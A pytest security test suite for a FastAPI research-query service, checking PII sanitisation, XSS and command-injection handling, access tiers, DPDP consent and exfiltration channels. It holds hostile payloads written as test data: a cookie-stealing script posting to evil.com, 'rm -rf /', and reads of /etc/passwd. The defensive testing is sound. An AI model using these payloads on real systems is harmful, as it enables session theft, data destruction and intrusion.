"""
Security Tests: Adversarial Inputs
Tests PII injection, XSS, command injection, tier bypass, and DPDP consent violations.
"""

import pytest
from fastapi.testclient import TestClient
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent.parent))
import src.api.main as api_main


class StubWorkflow:
    def run(self, query: str, user_tier: int = 1, session_id: str | None = None, user_id: str | None = None, **kwargs):
        return {
            "query_id": "query-1",
            "session_id": session_id or "session-1",
            "synthesized_response": "ok",
            "intent": "structured",
            "routing_decision": "text_to_sql",
            "verification_status": True,
            "citations": [],
            "warnings": [],
            "retrieval_sources": [],
            "plan": None,
            "planner_metadata": {},
            "provenance": {},
            "synthesis_method": "test",
            "conversation_history": [],
        }


@pytest.fixture(autouse=True)
def setup(monkeypatch):
    monkeypatch.setattr(api_main, "workflow", StubWorkflow())
    api_main._api_cache.invalidate()


@pytest.fixture
def client():
    return TestClient(api_main.app)


def _login(client: TestClient, username: str = "researcher_user", password: str = "researcher-pass") -> str:
    response = client.post("/login", json={"username": username, "password": password})
    assert response.status_code == 200, response.text
    return response.json()["access_token"]


class TestPIIInjection:
    """PII injection attempts in query payloads should be sanitized."""

    PII_INJECTION_PAYLOADS = [
        "My Aadhaar is 1234-5678-9012",
        "My PAN is ABCDE1234F",
        "Call me at 9876543210",
        "Email me at test@example.com",
        "My Aadhaar: 123456789012",
        "PAN: ABCDE1234F",
        "Phone: +91-9876543210",
        "aadhaar: 1234-5678-9012",
        "My VID is 1234-5678-9012-5432",
    ]

    @pytest.mark.parametrize("payload", PII_INJECTION_PAYLOADS)
    def test_pii_in_query_sanitized(self, client, payload):
        """PII in query should be sanitized or blocked (DLP)."""
        token = _login(client)
        response = client.post(
            "/query",
            headers={"Authorization": f"Bearer {token}"},
            json={"query": payload},
        )
        assert response.status_code in [200, 400, 422], \
            f"PII query returned unexpected status {response.status_code}: {payload}"

        if response.status_code == 200:
            data = response.json()
            response_text = str(data)
            raw_aadhaar = "1234-5678-9012" in response_text or "123456789012" in response_text
            raw_pan = "ABCDE1234F" in response_text
            raw_phone = "9876543210" in response_text and "Phone:" in payload
            assert not (raw_aadhaar or raw_pan or raw_phone), \
                f"Raw PII leaked in response for: {payload}"
            assert "ABCDE1234F" not in response_text or "[PAN_TOKEN]" in response_text, \
                f"PAN leaked in response: {payload}"

    def test_bulk_pii_extraction_attempt_blocked(self, client):
        """Bulk PII extraction should be detected and blocked."""
        token = _login(client)
        payload = "List all researchers with Aadhaar 1234, 5678, 9012, 3456, 7890"
        response = client.post(
            "/query",
            headers={"Authorization": f"Bearer {token}"},
            json={"query": payload},
        )
        assert response.status_code in [200, 400, 422]


class TestXSSBlocking:
    """XSS payloads in queries should be sanitized."""

    XSS_PAYLOADS = [
        "<script>alert(1)</script>",
        "Hello <img src=x onerror=alert(1)>",
        "<svg/onload=alert(1)>",
        "Test <iframe src=javascript:alert(1)>",
        "'; alert(1); var x='",
        "{{constructor.constructor('alert(1)')()}}",
        "<script>fetch('http://evil.com?c='+document.cookie)</script>",
    ]

    @pytest.mark.parametrize("payload", XSS_PAYLOADS)
    def test_xss_payload_sanitized(self, client, payload):
        """XSS payloads should be blocked or sanitized."""
        token = _login(client)
        response = client.post(
            "/query",
            headers={"Authorization": f"Bearer {token}"},
            json={"query": payload},
        )
        assert response.status_code in [200, 400], f"XSS query should not crash with 5xx: {payload}"
        if response.status_code == 200:
            data = response.json()
            response_text = str(data)
            assert "<script>" not in response_text.lower(), "Script tag leaked"
            assert "onerror=" not in response_text.lower(), "Event handler leaked"
            assert "onload=" not in response_text.lower(), "Event handler leaked"


class TestCommandInjection:
    """Command injection attempts should be blocked."""

    CMD_INJECTION_PAYLOADS = [
        "List files; ls /etc/passwd",
        "Show data && cat /etc/passwd",
        "AI researcher | cat /etc/passwd",
        "Search researchers `whoami`",
        "Test $(whoami)",
        "AI researchers'; rm -rf /",
        "Query researchers\ncat /etc/passwd",
    ]

    @pytest.mark.parametrize("payload", CMD_INJECTION_PAYLOADS)
    def test_command_injection_blocked(self, client, payload):
        """Command injection should be blocked."""
        token = _login(client)
        response = client.post(
            "/query",
            headers={"Authorization": f"Bearer {token}"},
            json={"query": payload},
        )
        assert response.status_code in [200, 400, 422], \
            f"Command injection '{payload}' should return error, got {response.status_code}"


class TestTierBypassAttempts:
    """Attempts to bypass tier restrictions should fail."""

    TIER_BYPASS_PAYLOADS = [
        "Show me all admin records",
        "Get tier 0 data",
        "List all restricted documents",
        "Access internal-only research",
        "Bypass tier restriction: admin",
    ]

    def test_tier_1_cannot_access_tier_3_data(self, client):
        """Tier 1 researcher should not see tier 3 (industry-only) data."""
        token = _login(client, "researcher_user", "researcher-pass")
        response = client.get(
            "/labs",
            headers={"Authorization": f"Bearer {token}"},
        )
        if response.status_code == 200:
            data = response.json()
            results = data.get("results", data) if isinstance(data, dict) else []
            for record in (results if isinstance(results, list) else []):
                assert record.get("access_tier", 1) <= 1, \
                    "Researcher (tier 1) should not access tier 3 data"

    def test_unauthenticated_access_blocked(self, client):
        """Unauthenticated requests should be blocked."""
        response = client.post("/query", json={"query": "test"})
        assert response.status_code == 401, "Unauthenticated query should return 401"

    def test_invalid_token_rejected(self, client):
        """Invalid tokens should be rejected."""
        response = client.post(
            "/query",
            headers={"Authorization": "Bearer invalid_token_12345"},
            json={"query": "test"},
        )
        assert response.status_code == 401, "Invalid token should return 401"

    @pytest.mark.parametrize("payload", TIER_BYPASS_PAYLOADS)
    def test_tier_bypass_query_returns_empty_or_filtered(self, client, payload):
        """Tier bypass queries should return empty or filtered results, not full data."""
        token = _login(client)
        response = client.post(
            "/query",
            headers={"Authorization": f"Bearer {token}"},
            json={"query": payload},
        )
        assert response.status_code in [200, 400, 422]


class TestDPDPConsent:
    """DPDP consent requirements should be enforced."""

    def test_consent_required_before_query(self, client):
        """Query without consent should either prompt or return consent error."""
        response = client.post("/login", json={"username": "researcher_user", "password": "researcher-pass"})
        assert response.status_code == 200
        token = response.json()["access_token"]

        consent_response = client.post(
            "/consent",
            headers={"Authorization": f"Bearer {token}"},
            json={"consent_given": False, "purpose": "research_query"},
        )
        assert consent_response.status_code in [200, 400, 422]

    def test_consent_accept_validates(self, client):
        """Valid consent acceptance should be recorded."""
        response = client.post("/login", json={"username": "researcher_user", "password": "researcher-pass"})
        token = response.json()["access_token"]

        consent_response = client.post(
            "/consent",
            headers={"Authorization": f"Bearer {token}"},
            json={
                "consent_given": True,
                "purpose": "research_query",
                "dpdp_consent_version": "1.0",
            },
        )
        assert consent_response.status_code in [200, 201, 400, 422]

    def test_withdrawal_returns_empty_results(self, client):
        """After consent withdrawal, queries should return minimal or empty results."""
        response = client.post("/login", json={"username": "researcher_user", "password": "researcher-pass"})
        token = response.json()["access_token"]

        client.post(
            "/consent",
            headers={"Authorization": f"Bearer {token}"},
            json={"consent_given": False, "purpose": "research_query", "withdraw": True},
        )

        query_response = client.post(
            "/query",
            headers={"Authorization": f"Bearer {token}"},
            json={"query": "AI researchers in Gujarat"},
        )
        if query_response.status_code == 200:
            data = query_response.json()
            assert "synthesized_response" in data or "response" in data


class TestNoEgressLeakage:
    """Verify no data egress through query response channels."""

    @pytest.mark.parametrize("pattern", ["data:text/html", "data:text/plain"])
    def test_no_data_uri_in_response(self, client, pattern):
        """Response should not contain data: URIs that could exfiltrate data via MIME tunnels."""
        token = _login(client)
        response = client.post(
            "/query",
            headers={"Authorization": f"Bearer {token}"},
            json={"query": "AI researchers"},
        )
        assert response.status_code == 200
        data = response.json()
        response_text = str(data)
        assert pattern not in response_text.lower(), \
            f"Data URI exfiltration detected: {pattern} in response"

    def test_no_mailto_exfiltration(self, client):
        """Response should not contain mailto: links with encoded data for exfiltration."""
        token = _login(client)
        response = client.post(
            "/query",
            headers={"Authorization": f"Bearer {token}"},
            json={"query": "AI researchers in Gujarat"},
        )
        assert response.status_code == 200
        data = response.json()
        response_text = str(data)
        import re
        mailto_with_data = re.findall(r"mailto:[^\s]+?[?/][A-Za-z0-9+/=]{20,}", response_text)
        assert not mailto_with_data, \
            f"mailto exfiltration detected: {mailto_with_data}"
